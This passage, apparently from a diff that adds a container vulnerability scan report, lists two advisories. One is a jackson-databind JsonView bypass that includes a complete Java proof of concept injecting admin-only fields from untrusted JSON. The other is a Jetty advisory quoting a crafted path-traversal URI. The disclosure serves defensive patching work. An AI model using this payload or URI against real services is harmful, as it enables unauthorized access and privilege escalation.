+                        │      │                     with "got changes merged forward, looks like it's all
+                        │      │                   covered now", but the forward-merge did not include the
+                        │      │                   ExtTypeId creator branch.
+                        │      │                     Proof of Concept
+                        │      │                     Compiles and runs against jackson-databind 2.21.4:
+                        │      │                    
+                        │      │                   ```java
+                        │      │                     import com.fasterxml.jackson.annotation.*;
+                        │      │                     import com.fasterxml.jackson.databind.ObjectMapper;
+                        │      │                     public class JsonViewExternalTypeIdBypass {
+                        │      │                         public static class PublicView {}
+                        │      │                         public static class AdminView extends PublicView {}
+                        │      │                         public static abstract class Asset { public String
+                        │      │                   name; }
+                        │      │                         public static class PublicAsset extends Asset {}
+                        │      │                         public static class AdminAsset extends Asset { public
+                        │      │                   String secret; }
+                        │      │                         public static class Container {
+                        │      │                             @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,
+                        │      │                                     include =
+                        │      │                   JsonTypeInfo.As.EXTERNAL_PROPERTY,
+                        │      │                                     property = "kind")
+                        │      │                             @JsonSubTypes({
+                        │      │                                 @JsonSubTypes.Type(value = PublicAsset.class,
+                        │      │                   name = "pub"),
+                        │      │                                 @JsonSubTypes.Type(value = AdminAsset.class, 
+                        │      │                   name = "admin")
+                        │      │                             })
+                        │      │                             @JsonView(AdminView.class)
+                        │      │                             public Asset asset;
+                        │      │                             public String label;
+                        │      │                             @JsonCreator
+                        │      │                             public Container(
+                        │      │                                     @JsonProperty("label") String label,
+                        │      │                                     @JsonProperty("asset")
+                        │      │                   @JsonView(AdminView.class) Asset asset) {
+                        │      │                                 this.label = label;
+                        │      │                                 this.asset = asset;
+                        │      │                             }
+                        │      │                         public static class Wrapper {
+                        │      │                             @JsonView(PublicView.class)
+                        │      │                             public Container data;
+                        │      │                         public static void main(String[] args) throws
+                        │      │                   Exception {
+                        │      │                             // Admin-only "asset" should be blocked when
+                        │      │                   reading with PublicView
+                        │      │                             String json =
+                        │      │                   "{\"data\":{\"label\":\"hello\",\"kind\":\"admin\","
+                        │      │                                         +
+                        │      │                   "\"asset\":{\"name\":\"foo\",\"secret\":\"LEAKED\"}}}";
+                        │      │                             ObjectMapper om = new ObjectMapper();
+                        │      │                             Wrapper r = om.readerWithView(PublicView.class)
+                        │      │                                     .forType(Wrapper.class)
+                        │      │                                     .readValue(json);
+                        │      │                             System.out.println(r.data);
+                        │      │                             // Actual on 2.21.4:   Container{label='hello',
+                        │      │                   asset=AdminAsset{name='foo', secret='LEAKED'}}
+                        │      │                             // Expected (secure):  Container{label='hello',
+                        │      │                   asset=null}
+                        │      │                             if (r.data.asset != null && r.data.asset
+                        │      │                   instanceof AdminAsset) {
+                        │      │                                 System.out.println("[!!] BYPASS CONFIRMED —
+                        │      │                   admin-only asset populated under PublicView");
+                        │      │                   A control case that removes include = As.EXTERNAL_PROPERTY
+                        │      │                   (forcing the normal property-based path) correctly returns
+                        │      │                   asset = null, confirming the bypass is specific to the
+                        │      │                   ExternalTypeId
+                        │      │                     code path and not a misconfiguration.
+                        │      │                   ### Impact
+                        │      │                     View-restricted (e.g. admin-only) creator properties can
+                        │      │                   be populated from untrusted input where @JsonView is used as
+                        │      │                    a write-side authorization boundary. Typical victims are
+                        │      │                   Spring Boot
+                        │      │                     REST controllers that use @JsonView(PublicView.class) on
+                        │      │                   the request body to whitelist user-settable fields — an
+                        │      │                   attacker can inject the restricted creator parameter
+                        │      │                   (including choosing
+                        │      │                     the polymorphic subtype via the sibling kind/type-id
+                        │      │                   property) by combining it with a polymorphic
+                        │      │                   @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same
+                        │      │                   field.
+                        │      │                   - CWE-863 (Incorrect Authorization)
+                        │      │                   - Same impact class as CVE-2026-54517 / CVE-2026-54518
+                        │      │                   - No RCE, no DoS — this is an access-control /
+                        │      │                   mass-assignment bypass
+                        │      │                   ### Trigger Conditions
+                        │      │                   Developer code must combine (no opt-in user configuration
+                        │      │                   required):
+                        │      │                   1. Property-based @JsonCreator on the outer type
+                        │      │                   2. A creator parameter annotated with
+                        │      │                   @JsonView(RestrictedView.class)
+                        │      │                   3. The same parameter annotated with
+                        │      │                   @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY,
+                        │      │                   property="...") 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ VendorSeverity   ─ ghsa: 2 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
+                        │      │                         ╰ V3Score : 6.5 
+                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/c
+                        │      │                  │      628b357ed143d8492756d5c1458cfb9fbeb29ed 
+                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/d
+                        │      │                  │      ea7eb466e98cc226c4ac65587581fb49926820c 
+                        │      │                  ╰ [3]: https://github.com/FasterXML/jackson-databind/security
+                        │      │                         /advisories/GHSA-mhm7-754m-9p8w 
+                        │      ├ PublishedDate   : 2026-07-21T19:40:12Z 
+                        │      ╰ LastModifiedDate: 2026-07-21T19:40:12Z 
+                        ╰ [11] ╭ VulnerabilityID : CVE-2026-8384 
+                               ├ VendorIDs        ─ [0]: GHSA-w7x5-g22v-xqhr 
+                               ├ PkgName         : org.eclipse.jetty:jetty-util 
+                               ├ PkgPath         : openaf/openaf.jar 
+                               ├ PkgIdentifier    ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-util@12.1.8 
+                               │                  ╰ UID : e793b260df8ee45b 
+                               ├ InstalledVersion: 12.1.8 
+                               ├ FixedVersion    : 12.0.35, 12.1.9 
+                               ├ Status          : fixed 
+                               ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                               │                  │         9a8305ba35c82bf9229f 
+                               │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                               │                            7ea46f72dd8aa890c14b 
+                               ├ SeveritySource  : ghsa 
+                               ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-8384 
+                               ├ DataSource       ╭ ID  : ghsa 
+                               │                  ├ Name: GitHub Security Advisory Maven 
+                               │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                               │                          cosystem%3Amaven 
+                               ├ Fingerprint     : sha256:d3323bb3888944b1f71f6d23a4bf005743f1f0c1a37819afb95d8
+                               │                   ef0f489ed14 
+                               ├ Title           : In Eclipse Jetty, an HTTP URI of this form:     
+                               │                   /public;/../admin/sec ... 
+                               ├ Description     : In Eclipse Jetty, an HTTP URI of this form:
+                               │                   
+                               │                   /public;/../admin/secret.txt
+                               │                   results in an unresolved path of:
+                               │                   /public/../admin/secret.txt
+                               │                   instead of the expected:
+                               │                   /admin/secret.txt
+                               │                   Jetty itself is not affected, as it will not serve the
+                               │                   secret.txt file because it will not pass the alias checker
+                               │                   (only resolved resources are served).
+                               │                   However, web applications that rely on resolved paths being
+                               │                   provided by Jetty may be confused when receiving an
+                               │                   unresolved path. 
+                               ├ Severity        : MEDIUM 
+                               ├ CweIDs           ─ [0]: CWE-647 
+                               ├ VendorSeverity   ─ ghsa: 2 
+                               ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
+                               │                         ╰ V3Score : 5.3 
+                               ├ References       ╭ [0]: https://github.com/jetty/jetty.project 
+                               │                  ├ [1]: https://github.com/jetty/jetty.project/commit/82969c77
+                               │                  │      f6da46e27008b10b3c14840cd31db084 
+                               │                  ├ [2]: https://github.com/jetty/jetty.project/commit/ade27ce9
+                               │                  │      3a37c33278720250d85c48601230ae3f 
+                               │                  ├ [3]: https://github.com/jetty/jetty.project/pull/14969 
+                               │                  ├ [4]: https://github.com/jetty/jetty.project/pull/14973 
+                               │                  ├ [5]: https://github.com/jetty/jetty.project/releases/tag/je
+                               │                  │      tty-12.0.35 
+                               │                  ├ [6]: https://github.com/jetty/jetty.project/releases/tag/je
+                               │                  │      tty-12.1.9 
+                               │                  ├ [7]: https://github.com/jetty/jetty.project/security/adviso
+                               │                  │      ries/GHSA-w7x5-g22v-xqhr 
+                               │                  ├ [8]: https://gitlab.eclipse.org/security/cve-assignment/-/w
+                               │                  │      ork_items/108 
+                               │                  ╰ [9]: https://nvd.nist.gov/vuln/detail/CVE-2026-8384 
+                               ├ PublishedDate   : 2026-07-14T09:16:42.05Z 
+                               ╰ LastModifiedDate: 2026-07-14T18:39:51.587Z 
 ```
